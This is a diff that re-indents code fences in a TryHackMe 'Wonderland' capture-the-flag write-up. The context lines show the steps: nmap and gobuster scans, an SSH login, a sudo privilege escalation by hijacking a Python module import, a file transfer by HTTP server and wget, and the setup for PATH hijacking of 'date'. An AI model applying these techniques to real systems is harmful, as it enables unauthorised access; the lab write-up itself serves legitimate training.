@@ -7,7 +7,7 @@ These notes are from a challenge I did @[tryhackme](https://tryhackme.com) calle
 Let's scan for open ports first:```nmap -sC -sV 10.10.28.31```
 
 ??? output "Nmap output"
-   ``` txt
+    ``` txt
     Nmap scan report for 10.10.28.31
     Host is up (0.075s latency).
     Not shown: 998 closed ports
@@ -23,12 +23,12 @@ Let's scan for open ports first:```nmap -sC -sV 10.10.28.31```
 
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds
-   ```
+    ```
 
 Let's search for paths on the webpage on port 80:```gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.28.31:80```
 
 ??? output "Gobuster output"
-   ``` txt
+    ``` txt
     Gobuster v3.1.0
     by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
     ===============================================================
@@ -45,7 +45,7 @@ Let's search for paths on the webpage on port 80:```gobuster dir -w /usr/share/d
     /img                  (Status: 301) [Size: 0] [--> img/]
     /r                    (Status: 301) [Size: 0] [--> r/]
     /poem                 (Status: 301) [Size: 0] [--> poem/]
-   ```
+    ```
 
 ## Steganography
 
@@ -89,7 +89,7 @@ Viewing the HTML code we see:
 Let's try to login using those credentials: `ssh alice@10.10.28.31`
 
 ??? output "ssh login"
-   ``` txt
+    ``` txt
     Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 
     * Documentation:  https://help.ubuntu.com
@@ -107,7 +107,7 @@ Let's try to login using those credentials: `ssh alice@10.10.28.31`
     0 updates are security updates.
 
     Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
-   ```
+    ```
 
 It is strange to see root.txt in the folder of alice.```find ./ -type f -iname "user.txt"``` doesn't reveal anything. The hint "Everything is upside down here." means if root.txt is here, maybe user.txt is under /root. We can directly read user.txt by running```cat /root/user.txt```. lol...
 
@@ -126,14 +126,14 @@ for i in range(10):
 Running `sudo -l` shows we can run `walrus_and_the_carpenter.py` as rabbit:
 
 ??? output "ssh login"
-   ``` txt
+    ``` txt
     Matching Defaults entries for alice on wonderland:
         env_reset, mail_badpass,
         secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
     User alice may run the following commands on wonderland:
         (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-   ```
+    ```
 
 To escalate privileges we can misuse the fact that we can run `walrus_and_the_carpenter.py` by creating our own `random.py` with the following content to overwrite the random function imported and called in `walrus_and_the_carpenter.py`
 
@@ -179,15 +179,15 @@ Let's copy `teaParty` to the kali machine and view it in detail with `strings te
 ??? output "strings teaParty"
     Serving teaParty to my kali machine
 
-   ``` txt
+    ``` txt
     python3 -m http.server
     Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
     10.9.193.173 - - [21/Oct/2021 19:59:25] "GET /teaParty HTTP/1.1" 200 -
-   ```
+    ```
 
     Downloading teaParty file
 
-   ``` txt
+    ``` txt
     wget 10.10.28.31:8000/teaParty
     --2021-10-21 15:59:24--  http://10.10.28.31:8000/teaParty
     Connecting to 10.10.28.31:8000... connected.
@@ -198,11 +198,11 @@ Let's copy `teaParty` to the kali machine and view it in detail with `strings te
     teaParty                   100%[========================================>]  16.42K  --.-KB/s    in 0.02s
 
     2021-10-21 15:59:24 (895 KB/s) - ‘teaParty’ saved [16816/16816]
-   ```
+    ```
 
     Run```strings teaParty```
 
-   ``` txt
+    ``` txt
     /lib64/ld-linux-x86-64.so.2
     2U~4
     libc.so.6
@@ -286,7 +286,7 @@ Let's copy `teaParty` to the kali machine and view it in detail with `strings te
     .data
     .bss
     .comment
-   ```
+    ```
 
 We see the program calls `date` in this line:```/bin/echo -n 'Probably by ' && date --date='next hour' -R```. Just like with "random" from above, let's create our own `date` file e.g.:
 
